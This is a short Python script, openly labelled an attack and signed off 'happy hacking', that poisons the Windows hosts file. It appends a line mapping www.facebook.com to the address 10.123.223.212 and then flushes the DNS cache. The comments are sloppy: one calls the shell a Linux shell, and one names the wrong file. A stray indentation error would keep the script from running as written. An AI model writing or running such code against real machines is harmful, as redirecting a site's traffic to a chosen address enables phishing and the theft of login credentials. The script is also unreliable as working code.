

# this is simple pythen code , can alter the DNS host file is windows operating system
# Can result in false ip-domain mapping or poisons the dns records.


import subprocess
import sys

import os

# command changes the directory of the system
os.chdir("C:\Windows\System32\drivers\etc") 
# write the false dns entries here in the hosts.conf file in the \etc windows directory 

command = "echo 10.123.223.212 www.facebook.com >> hosts"  # command to alter the dns entries/ writing the entries to the file

# opening the linux shell to execute the command
 CMD = subprocess.Popen(command, shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

flush = "ipconfig /flushdns" # flushes the original dns entries 

CMD = subprocess.Popen(flush, shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

# end of attack  
# happy hacking 
